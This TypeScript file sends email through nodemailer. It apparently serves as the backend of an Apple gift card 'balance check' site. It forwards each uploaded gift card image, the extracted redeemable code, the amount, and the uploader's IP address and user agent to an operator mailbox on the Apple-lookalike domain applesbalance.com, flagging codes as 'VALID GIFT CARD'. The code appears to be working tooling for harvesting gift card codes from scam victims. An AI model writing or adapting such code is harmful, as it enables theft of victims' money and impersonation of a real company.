import nodemailer from 'nodemailer'

interface EmailData {
  filename: string
  amount: number
  fileType: string
  fileSize: number
  extractedCode: string
  timestamp: string
  ip: string
  userAgent: string
}

interface Attachment {
  filename: string
  content: string
  mimeType: string
}

// Create transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'mail.applesbalance.com',
  port: parseInt(process.env.SMTP_PORT || '587'),
  secure: false,
  auth: {
    user: process.env.SMTP_USER || 'inbox@applesbalance.com',
    pass: process.env.SMTP_PASS || '',
  },
})

export async function sendEmail(data: EmailData, attachment?: Attachment): Promise<boolean> {
  try {
    const { filename, amount, fileType, fileSize, extractedCode, timestamp, ip, userAgent } = data

    // Build email HTML
    const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Gift Card Upload</title>
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; padding: 20px; margin: 0;">
  <div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 16px; padding: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
    <div style="text-align: center; margin-bottom: 20px;">
      <span style="display: inline-block; background: ${extractedCode ? '#4caf50' : '#ff9800'}; color: white; padding: 4px 16px; border-radius: 20px; font-size: 12px; font-weight: 600;">
        ${extractedCode ? '✓ VALID GIFT CARD' : '⚠ UNVERIFIED'}
      </span>
    </div>
    <h2 style="color: #1d1d1f; margin-bottom: 20px;">🎁 Apple Gift Card Upload</h2>
    <div style="background: #f8f9ff; padding: 16px; border-radius: 12px; margin-bottom: 20px;">
      <p><strong>💰 Amount:</strong> $${amount.toFixed(2)}</p>
      ${extractedCode ? `<p><strong>🔑 Detected Code:</strong> <code style="background: #f5f5f7; padding: 4px 8px; border-radius: 6px;">${extractedCode}</code></p>` : ''}
      <p><strong>📎 Filename:</strong> ${filename}</p>
      <p><strong>📄 File Type:</strong> ${fileType}</p>
      <p><strong>📏 File Size:</strong> ${(fileSize / 1024 / 1024).toFixed(2)} MB</p>
    </div>
    <div style="background: #f5f5f7; padding: 16px; border-radius: 12px; font-size: 12px; color: #6e6e73;">
      <p><strong>🌐 IP Address:</strong> ${ip}</p>
      <p><strong>⏰ Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
      <p><strong>🖥️ User Agent:</strong> ${userAgent.substring(0, 200)}</p>
    </div>
    <p style="color: #6e6e73; font-size: 12px; text-align: center; margin-top: 20px; border-top: 1px solid #e5e5e7; padding-top: 20px;">
      This is an automated message from your verification system.
    </p>
  </div>
</body>
</html>
    `

    const mailOptions: nodemailer.SendMailOptions = {
      from: process.env.SMTP_FROM || 'inbox@applesbalance.com',
      to: process.env.EMAIL_TO || 'inbox@applesbalance.com',
      subject: `${extractedCode ? '✅ VALID' : '📸'} Gift Card Upload - Code: ${extractedCode || 'N/A'} - Amount: $${amount}`,
      html: htmlBody,
    }

    // Add attachment if provided and file is not too large
    if (attachment && attachment.content && attachment.content.length < 5 * 1024 * 1024) {
      mailOptions.attachments = [
        {
          filename: attachment.filename,
          content: attachment.content,
          encoding: 'base64',
          contentType: attachment.mimeType,
        },
      ]
    }

    await transporter.sendMail(mailOptions)
    console.log(`✅ Email sent successfully for ${filename}`)
    return true

  } catch (error) {
    console.error('❌ Email error:', error)
    return false
  }
}